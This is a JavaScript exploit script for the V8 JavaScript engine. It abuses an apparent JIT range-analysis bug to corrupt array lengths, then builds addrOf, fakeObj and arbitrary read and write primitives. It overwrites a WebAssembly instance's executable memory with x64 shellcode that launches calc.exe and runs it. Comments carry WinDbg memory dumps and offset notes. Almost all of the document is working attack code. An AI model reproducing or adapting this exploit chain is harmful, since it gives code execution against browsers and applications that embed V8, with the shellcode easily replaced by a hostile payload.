var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);

function myftoi(val) {
    f64[0] = val;
    return [BigInt(u32[0]), BigInt(u32[1])];
}

function myitof(lower, upper) {
    u32[0] = Number(lower);
    u32[1] = Number(upper);
    return f64[0];
}

function ftoi(val) {
    f64[0] = val;
    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function itof(val) {
    u32[0] = Number(val & 0xffffffffn);
    u32[1] = Number(val >> 32n);
    return f64[0];
}

function hex(v) {
    return '0x' + v.toString(16);
}

function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
        if (i == -Infinity) {
            x = +Infinity;
        }

        if (++k > 10) {
            break;
        }
    }
    i = Math.max(i, 0x100000800);
    i = Math.min(0x100000801, i);		
    i -= 0x1000007fa;
    i >>= 1;
    i += 10;
    var array = new Array(i);
    array[0] = 1.1;
    var float_arr = [1.1, 1.2, 1.3, 1.4];
    var arr_obj = [{"A": 1},{"A": 1},{"A": 1},{"A": 1},{"A": 1},{"A": 1},{"A": 1},{"A": 1}];
    var x = new ArrayBuffer(0x500);
    var y = new DataView(x);
    y.setUint32(0, 0x41414141);
    y.setUint32(4, 0x42424242);
    var ab_arr = [x,x,x,x,x,x]
    var dv_arr = [y,y,y,y,y,y]
    return [array, float_arr, arr_obj, i, ab_arr, dv_arr];
}

/*
MAP
PROPERTIES (upper)
ELEMENTS
LENGTH (upper)
*/

function getCorruptedArray() {
    for (let j = 0; j < 11000; j++) {
        let _ret = trigger();
        if (_ret[3] == -1011) {
            return _ret;
        }
    }
}

function main() {
    const LENGTH_AND_ELEMENTS_INDEX_FLOAT_ARR = 21; // length is upper, elements is lower
    const MAP_AND_PROPERTIES_INDEX_FLOAT_ARR = 20;
    let _ret = getCorruptedArray();
    let corruptedArray = _ret[0];
    let floatArray = _ret[1];
    let objArray = _ret[2];
    let abArray = _ret[4];
    for (let k = 0; k < 100; k++) {
        if (k > 12 && 1==2) {
            print("index " + k + ": " + hex(ftoi(corruptedArray[k])))
        }
    }

    let lengthToSet = 0x2n;
    let floatArrayLengthAndElements = _ret[0][LENGTH_AND_ELEMENTS_INDEX_FLOAT_ARR]
    let floatArrayLengthOriginal = floatArray.length
    let [temp1, temp2] = myftoi(floatArrayLengthAndElements);
    let replacementValue = myitof(temp1, lengthToSet * 2n + 0n);
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_FLOAT_ARR] = replacementValue;
    if(floatArray.length != lengthToSet) {
        print("[-] Something went wrong")
    } else {
        print("[+] We can control the float array")
    }
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_FLOAT_ARR] = floatArrayLengthAndElements;
    if(floatArray.length != floatArrayLengthOriginal) {
        print("[-] Something went wrong")
    } else {
        print("[!] Restoring the float array")
    }

    const LENGTH_AND_ELEMENTS_INDEX_OBJ_ARR = 44; // length is upper, elements is lower
    const MAP_AND_PROPERTIES_INDEX_OBJ_ARR = 43;
    let objArrayLengthAndElements = _ret[0][LENGTH_AND_ELEMENTS_INDEX_OBJ_ARR]
    let objArrayLengthOriginal = objArray.length
    let [_temp1, _temp2] = myftoi(objArrayLengthAndElements);
    let _replacementValue = myitof(_temp1, lengthToSet * 2n + 0n);
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_OBJ_ARR] = _replacementValue;
    if(objArray.length != lengthToSet) {
        print("[-] Something went wrong")
    } else {
        print("[+] We can control the obj array")
    }
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_OBJ_ARR] = objArrayLengthAndElements;
    if(objArray.length != objArrayLengthOriginal) {
        print("[-] Something went wrong")
    } else {
        print("[!] Restoring the obj array")
    }

    let _lengthToSet = 0x3n;
    const LENGTH_AND_ELEMENTS_INDEX_AB_ARR = 63; // length is upper, elements is lower
    const MAP_AND_PROPERTIES_INDEX_AB_ARR = 62;
    let abArrayLengthAndElements = _ret[0][LENGTH_AND_ELEMENTS_INDEX_AB_ARR]
    let abArrayLengthOriginal = abArray.length
    let [__temp1, __temp2] = myftoi(abArrayLengthAndElements);
    let __replacementValue = myitof(__temp1, _lengthToSet * 2n + 0n);
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_AB_ARR] = __replacementValue;
    if(abArray.length != _lengthToSet) {
        print("[-] Something went wrong")
    } else {
        print("[+] We can control the arraybuffer array")
    }
    _ret[0][LENGTH_AND_ELEMENTS_INDEX_AB_ARR] = abArrayLengthAndElements;
    if(abArray.length != abArrayLengthOriginal) {
        print("[-] Something went wrong")
    } else {
        print("[!] Restoring the arraybuffer array")
    }

    function addrOf(obj) {
        let originalIndex0ObjArray = objArray[0]
        objArray[0] = obj;
        let floatArrayMapAndProp = _ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR]
        let objArrayMapAndProp = _ret[0][MAP_AND_PROPERTIES_INDEX_OBJ_ARR]
        let [floatArrayMap, floatArrayProp] = myftoi(floatArrayMapAndProp)
        let [objArrayMap, objArrayProp] = myftoi(objArrayMapAndProp);
        //eval(`%DebugPrint(objArray[0])`);
        _ret[0][MAP_AND_PROPERTIES_INDEX_OBJ_ARR] = myitof(floatArrayMap, objArrayProp)
        let address = ftoi(objArray[0]);
        print("[*] We leaked the following address: " + hex(address))
        print("[*] Restoring structs to prevent crashing")
        _ret[0][MAP_AND_PROPERTIES_INDEX_OBJ_ARR] = objArrayMapAndProp
        objArray[0] = originalIndex0ObjArray;
        return address;
    }

    function fakeObj(addressInInt) {
        let originalIndex0FloatArray = floatArray[0]
        floatArray[0] = itof(addressInInt);
        let floatArrayMapAndProp = _ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR]
        let objArrayMapAndProp = _ret[0][MAP_AND_PROPERTIES_INDEX_OBJ_ARR]
        let [floatArrayMap, floatArrayProp] = myftoi(floatArrayMapAndProp)
        let [objArrayMap, objArrayProp] = myftoi(objArrayMapAndProp);
        _ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR] = myitof(objArrayMap, floatArrayProp);
        let fakeObjWeCreated = floatArray[0]
        _ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR] = floatArrayMapAndProp;
        floatArray[0] = originalIndex0FloatArray
        return fakeObjWeCreated
    }

    // let poc = new Array();
    // addrOf(poc);
    // eval(`%DebugPrint("DEBUG")`);
    // C:\v8\v8\out\x64.release\d8.exe C:\v8\v8\out\x64.release\script.js
    // bp d8!v8::internal::Runtime_DebugPrint

    function arb_read_compressed_pointer_location_must_be_lower(addr) {
        /*
        0:000> dq 00000292081631FD-1
        00000292`081631fc  080406e1`08241889 00000008`08163215
        ...
        ...
        DebugPrint: 00000292081631FD: [JSArray]
        - map: 0x029208241889 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
        - prototype: 0x029208208d75 <JSArray[0]>
        - elements: 0x029208163215 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
        - length: 4
        - properties: 0x0292080406e1 <FixedArray[0]> {
            #length: 0x02920818015d <AccessorInfo> (const accessor descriptor)
        }
        - elements: 0x029208163215 <FixedDoubleArray[4]> {
                0: 2.1
                1: 2.2
                2: 2.3
                3: 2.4
        }
        ...
        ...
        0:000> dq 0x029208163215-1
        00000292`08163214  00000008`08040a0d 4000cccc`cccccccd
        00000292`08163224  40019999`9999999a 40026666`66666666
        00000292`08163234  40033333`33333333 0000001e`08241f91

        I need to corrupt 08163215 value so that we can read whatever 08163215
        is pointing to, which is the element pointer
        */
        let ACCOUNT_FOR_ELEMENT_POINTER_OFFSET = 0x8n
        if (addr % 2n == 0) addr += 1n;
        let [lower, upper] = myftoi(itof(addr));
        var worker = [_ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR], myitof(lower+0n-ACCOUNT_FOR_ELEMENT_POINTER_OFFSET,0x8n), 2.3, 2.4];
        var worker_addr = addrOf(worker);
        /*
        0:000> dq 000000DD082986D1-1      // Location of Array
        000000dd`082986d0  080406e1`08241889 00000008`082986a9
        ...
        0:000> dq 000000DD082986D1-1-0x20 //
        000000dd`082986b0  080406e1`08241889 40019999`9999999a
        000000dd`082986c0  40026666`66666666 40033333`33333333
        ...
        0:000> dq 0x00dd082986a9-1        // Location of Array's Element Pointer
        000000dd`082986a8  00000008`08040a0d 080406e1`08241889
        000000dd`082986b8  40019999`9999999a 40026666`66666666
        000000dd`082986c8  40033333`33333333 080406e1`08241889
        ...
        080406e1`08241889 is the map and properties, just need to set 40019999`9999999a
        to the length and pointer. You have to -0x10n 
        */
        let fake = fakeObj(worker_addr-0x20n);
        let _return = ftoi(fake[0]);
        return _return;
    }

    /*
    let testArray = [3.1,3.2,3.3,3.4,3.5,3.6]
    let testArrayAddress = addrOf(testArray);
    //let whatIAmPointingTo = arb_read_compressed_pointer_location_must_be_lower(testArrayAddress);
    let whatIAmPointingTo = arb_read_compressed_pointer_location_must_be_lower(testArrayAddress+0x8n);
    let finalValue = arb_read_compressed_pointer_location_must_be_lower(whatIAmPointingTo+0x8n);
    if (itof(finalValue) != 3.1) {
        print("[-] Something went wrong")
    } else {
        print("[!] arb_read_compressed_pointer_location_must_be_lower() works")
    }
    */

    function arb_write_compressed_pointer_location_must_be_lower(addr, floatValueToWrite) {
        let ACCOUNT_FOR_ELEMENT_POINTER_OFFSET = 0x8n
        if (addr % 2n == 0) addr += 1n;
        let [lower, upper] = myftoi(itof(addr));
        var worker = [_ret[0][MAP_AND_PROPERTIES_INDEX_FLOAT_ARR], myitof(lower+0n-ACCOUNT_FOR_ELEMENT_POINTER_OFFSET,0x8n), 2.3, 2.4];
        var worker_addr = addrOf(worker);
        let fake = fakeObj(worker_addr-0x20n);
        fake[0] = floatValueToWrite;
    }

    //arb_write_compressed_pointer_location_must_be_lower(whatIAmPointingTo+0x8n, 2.2);
    //if (testArray[0] != 2.2) {
    //    print("[-] Something went wrong")
    //} else {
    //    print("[!] arb_write_compressed_pointer_location_must_be_lower() works")
    //}

    function arb_read64(addr) {
        /*
        DebugPrint: 000003E108102EA1: [JSArrayBuffer]
        - map: 0x03e108241181 <Map(HOLEY_ELEMENTS)> [FastProperties]
        - prototype: 0x03e108207545 <Object map = 000003E1082411A9>
        - elements: 0x03e1080406e1 <FixedArray[0]> [HOLEY_ELEMENTS]
        - embedder fields: 2
        - backing_store: 000001C06990BA80
        - byte_length: 100
        - detachable
        - properties: 0x03e1080406e1 <FixedArray[0]> {}
        - embedder fields = {
            0, aligned pointer: 0000000000000000
            0, aligned pointer: 0000000000000000
        }
        000003E108241181: [Map]
        - type: JS_ARRAY_BUFFER_TYPE
        - instance size: 48
        - inobject properties: 0
        - elements kind: HOLEY_ELEMENTS
        - unused property fields: 0
        - enum length: invalid
        - stable_map
        - back pointer: 0x03e108040305 <undefined>
        - prototype_validity cell: 0x03e108180449 <Cell value= 1>
        - instance descriptors (own) #0: 0x03e1080401ad <DescriptorArray[0]>
        - prototype: 0x03e108207545 <Object map = 000003E1082411A9>
        - constructor: 0x03e108207475 <JSFunction ArrayBuffer (sfi = 000003E108187DBD)>
        - dependent code: 0x03e1080401e5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
        - construction counter: 0
        0:000> dd 000001C4B6BD9530
        000001c4`b6bd9530  41414141 42424242 00000000 00000000
        000001c4`b6bd9540  00000000 00000000 00000000 00000000
        000001c4`b6bd9550  00000000 00000000 00000000 00000000
        000001c4`b6bd9560  00000000 00000000 00000000 00000000
        000001c4`b6bd9570  00000000 00000000 00000000 00000000
        000001c4`b6bd9580  00000000 00000000 00000000 00000000
        000001c4`b6bd9590  00000000 abababab abababab abababab
        000001c4`b6bd95a0  abababab 00000000 00000000 00000000
        0:000> dd 000003BE0814BA11-1
        000003be`0814ba10  08241181 080406e1 080406e1 00000064
        000003be`0814ba20  00000000 b6bd9530 000001c4 00000002
        000003be`0814ba30  00000000 00000000 00000000 00000000
        000003be`0814ba40  08240c31 080406e1 080406e1 0814ba11
        000003be`0814ba50  00000000 00000000 00000064 00000000
        000003be`0814ba60  b6bd9530 000001c4 00000000 00000000
        000003be`0814ba70  00000000 00000000 080404a9 00000010
        000003be`0814ba80  0814baa1 0814bab9 0814bad1 0814bae9
        index 47: 0xcfb2316000000000 (upper 32bits of index 47 is the lower 32bits of backing store)
        index 48: 0x2000001a4        (lower 32bits of index 48 is the upper 32bits of backing store)
        _ret[0][47] = itof(0x4444444433333333n);
        _ret[0][48] = itof(0x2222222211111111n);
        backing_store: 1111111144444444
        */
        //if (addr % 2n == 0) addr += 1n;
        addr = itof(addr);
        const BACKINGSTORE_47 = 47;
        const BACKINGSTORE_48 = 48;
        //const BACKINGSTORE_55 = 55;
        //let [lower, upper] = myftoi(_ret[0][BACKINGSTORE_55]);
        let [lower, upper] = myftoi(addr);
        let BACKINGSTORE_47_s = _ret[0][BACKINGSTORE_47]
        let BACKINGSTORE_48_s = _ret[0][BACKINGSTORE_48]
        let [lower1,upper1] = myftoi(_ret[0][BACKINGSTORE_47]);
        let [lower2,upper2] = myftoi(_ret[0][BACKINGSTORE_48]);
        _ret[0][BACKINGSTORE_47] = myitof(lower1, lower); // lower
        _ret[0][BACKINGSTORE_48] = myitof(upper, upper2); // upper
        let dv = _ret[5][0];
        let read64Lower = dv.getUint32(0);
        let read64Upper = dv.getUint32(4);
        _ret[0][BACKINGSTORE_47] = BACKINGSTORE_47_s;
        _ret[0][BACKINGSTORE_48] = BACKINGSTORE_48_s;
        return ftoi(myitof(read64Lower, read64Upper))
    }

    function arb_write64(addr, lowerValue, upperValue) {
        //if (addr % 2n == 0) addr += 1n;
        addr = itof(addr);
        const BACKINGSTORE_47 = 47;
        const BACKINGSTORE_48 = 48;
        //const BACKINGSTORE_55 = 55;
        //let [lower, upper] = myftoi(_ret[0][BACKINGSTORE_55]);
        let [lower, upper] = myftoi(addr);
        let BACKINGSTORE_47_s = _ret[0][BACKINGSTORE_47]
        let BACKINGSTORE_48_s = _ret[0][BACKINGSTORE_48]
        let [lower1,upper1] = myftoi(_ret[0][BACKINGSTORE_47]);
        let [lower2,upper2] = myftoi(_ret[0][BACKINGSTORE_48]);
        _ret[0][BACKINGSTORE_47] = myitof(lower1, lower); // lower
        _ret[0][BACKINGSTORE_48] = myitof(upper, upper2); // upper
        let dv = _ret[5][0];
        dv.setUint32(0, lowerValue);
        dv.setUint32(4, upperValue);
        _ret[0][BACKINGSTORE_47] = BACKINGSTORE_47_s;
        _ret[0][BACKINGSTORE_48] = BACKINGSTORE_48_s;
    }

    function reverseUint32(num) {
        // Extract each byte from the number
        const byte1 = (num & 0xFF) << 24;
        const byte2 = (num & 0xFF00) << 8;
        const byte3 = (num & 0xFF0000) >> 8;
        const byte4 = (num & 0xFF000000) >>> 24;
        const reversedNum = byte1 | byte2 | byte3 | byte4;
        return reversedNum >>> 0; 
    }

    function arb_writeShellCode(addr, shellcodeArray, length) {
        //if (addr % 2n == 0) addr += 1n;
        addr = itof(addr);
        const BACKINGSTORE_47 = 47;
        const BACKINGSTORE_48 = 48;
        //const BACKINGSTORE_55 = 55;
        //let [lower, upper] = myftoi(_ret[0][BACKINGSTORE_55]);
        let [lower, upper] = myftoi(addr);
        let BACKINGSTORE_47_s = _ret[0][BACKINGSTORE_47]
        let BACKINGSTORE_48_s = _ret[0][BACKINGSTORE_48]
        let [lower1,upper1] = myftoi(_ret[0][BACKINGSTORE_47]);
        let [lower2,upper2] = myftoi(_ret[0][BACKINGSTORE_48]);
        _ret[0][BACKINGSTORE_47] = myitof(lower1, lower); // lower
        _ret[0][BACKINGSTORE_48] = myitof(upper, upper2); // upper
        let dv = _ret[5][0];

        for (let i = 0; i < length; i++) {
            dv.setUint32(i*4, reverseUint32(shellcodeArray[i]));
        }

        _ret[0][BACKINGSTORE_47] = BACKINGSTORE_47_s;
        _ret[0][BACKINGSTORE_48] = BACKINGSTORE_48_s;
    }

    /*
    0:000> !address -f:PAGE_EXECUTE_READWRITE                                        
    Mapping file section regions...
    Mapping module regions...
    Mapping PEB regions...
    Mapping TEB and stack regions...
    Mapping heap regions...
    Mapping page heap regions...
    Mapping other regions...
    Mapping stack trace database regions...
    Mapping activation context regions...

            BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
    --------------------------------------------------------------------------------------------------------------------------
        bd`319c1000       bd`319c2000        0`00001000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [................]
    
    0:000> dq 0000036108213E81-1
    00000361`08213e80  080406e1`082446f1 e5820000`080406e1
    00000361`08213e90  00010000`000001e4 0000ffff`00000000
    00000361`08213ea0  00000060`00000000 080406e1`00000361
    00000361`08213eb0  000001e4`65176680 00000000`080406e1
    00000361`08213ec0  00000000`00000000 00000000`00000000
    00000361`08213ed0  00000000`00000000 000001e4`651680f0
    00000361`08213ee0  00000361`00000000 000000bd`319c1000
    00000361`08213ef0  082eb699`082eb541 08213e69`08200b3d
    */
    let ab = new ArrayBuffer(0x1024);
    let abu8 = new Uint8Array(ab);
    let ab32 = new Uint32Array(ab);
    let calc_shellcode = new Uint8Array(
        [   
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
            0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
            0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
            0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
            0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
            0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
            0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
            0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
            0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
            0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
            0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
            0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
            0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
            0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
            0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
            0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
            0x65, 0x78, 0x65, 0x00, 0x90, 0x90, 0x90, 0x90
        ]
    );
    print("[*] calc shellcode length: " + calc_shellcode.length/8)
    abu8.set(calc_shellcode)
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    let wasmInstanceAddr = addrOf(wasmInstance);
    print(`[*] wasm address: ${hex(wasmInstanceAddr)}`);
    let wasmRWXAddr = arb_read_compressed_pointer_location_must_be_lower(wasmInstanceAddr+0x68n);
    print(`[*] RWX address: ${hex(wasmRWXAddr)}`);
    //arb_write64(wasmRWXAddr, 0xcccccccc, 0x90909090);
    arb_writeShellCode(wasmRWXAddr, ab32, 100);
    func();
}

main();